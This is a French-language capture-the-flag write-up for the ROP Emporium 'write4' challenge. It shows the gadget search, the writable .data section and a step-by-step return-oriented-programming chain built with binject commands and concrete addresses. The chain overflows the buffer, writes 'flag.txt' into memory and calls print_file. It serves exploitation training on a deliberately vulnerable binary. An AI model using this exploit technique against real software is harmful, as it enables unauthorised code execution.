# write4 challenge

https://ropemporium.com/challenge/write4.html

> wget https://ropemporium.com/binary/write4.zip <br>
> unzip write4.zip <br>
> checksec write4 <br>
> strings write4 <br>

Rien de très utile ne peut être tiré de ces commandes, il n'y a littéralment aucune chaine à exploiter dans cet exécutable, comme précisé dans l'énoncé. Peut-être qu'avec **gdb** nous obtiendrons plus d'informations:

> gdb write4 <br>
> info func <br>

Nous remarquons toujours notre fonction contenant le buffer vulnérable `pwnme`, *externe* et résolue par **PLT** comme dans le challenge précédent. Il y aussi la fonction *externe* cible `print_file`.

Au niveau des fonctions *interne*, on repère `usefulFunction` et son appel à `print_file@plt` avec son unique argument qui est chargé dans le registre `%rdi` depuis l'addresse *0x4006b4*. Avec **gdb**:
> x/s 0x4006b4 <br>
> 0x4006b4: "nonexistent"

En utilisant **rabin2**:
> rabin2 -z write4 <br>
> rabin2 -S write4

Nous pouvons localiser l'argument passé à la fonction `print_file@plt` par `usefulFunction` dans la section **.rodata**; L'utilisation de **rabin2** nous permet d'identifier les permissions associés à chacunes des sections (même si c'est toujours les mêmes..), et cette dernière est *read-only*. Comme suggéré dans le challenge, nous devrions plutôt utiliser une section sur laquelle le programme peut écrire; nous utiliserons donc la section **.data** qui a les permissions pour lire et écrire.
> rabin2 -S write4 <br>
> [Sections] <br>
> <br>
> nth paddr        size vaddr       vsize perm type        name <br>
> ――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――― <br>
> 23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data

## Inspecteur gadget

D'un autre côté, nous avons la fonction `usefulGadgets`, qui ne contient rien d'autre que l'instruction `mov` pour copier le contenu du registre `%r15` à l'addresse contenue dans `%r14`:
> 0x0000000000400628 <+0>:&emsp;mov %r15,(%r14)

Cela sera notre ROP gadget, mais pas l'unique ! Comme pour le challenge **callme**, nous aurons besoin d'un gadget pour `pop`er les valeurs à charger dans les registres `%r14` et `%r15`. En utilisant **ropper**:
> ropper --file write4 --search "pop" <br>
> 0x0000000000400690:&emsp;pop r14; pop r15; ret; <br>
> 0x0000000000400693:&emsp;pop rdi; ret;

Il existe d'ailleur au autre gadget pour `pop` une valeur dans le registre `%rdi`, par convention le premier paramètre d'appel de fonction. 

## La solution

En nous basant sur la solution proposée pour le challenge **callme**:
1. Le binaire pour l'overflow (40 bytes pour atteindre la *return address* dans la stack, comme d'habitude):
> binject -of ovf.bin -ns 40 A

2. Le `pop` gadget, pour charger l'addresse de **.data** dans `%r14`, et la chaîne de caractère pour le paramètre, dans `%r15`:
> binject -of flg.bin -x64 400690 -x64 601028 -s flag.txt

3. Le `mov` gadget pour charger le contenu de `%r15` à l'addresse contenue par `r%14`:
> binject -of mem.bin -if flg.bin -x64 400628

4. Le `pop` gadget pour charger l'addresse de **.data** dans `%rdi`:
> binject -of prm.bin -x64 400693 -x64 601028

5. L'appel de la fonction `print_file` (dans la section **.plt** puisque pas encore résolue):
> binject -of cll.bin -if prm.bin -x64 400510

6. On assemble le tout:
> binject -of ola.bin -if ovf.bin -if mem.bin -if cll.bin

Et on est bon:
> Thank you! <br>
> ROPE{a_placeholder_32byte_flag!} <br>
> Segmentation fault